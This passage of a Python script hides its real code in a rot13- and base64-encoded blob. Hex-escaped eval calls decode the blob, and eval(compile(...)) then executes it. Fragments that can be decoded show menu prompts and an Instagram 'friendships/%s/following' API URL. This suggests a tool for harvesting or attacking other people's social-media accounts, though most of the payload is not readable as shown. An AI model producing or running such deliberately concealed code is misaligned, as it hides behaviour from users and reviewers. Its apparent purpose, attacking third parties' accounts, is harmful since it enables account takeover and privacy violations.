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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
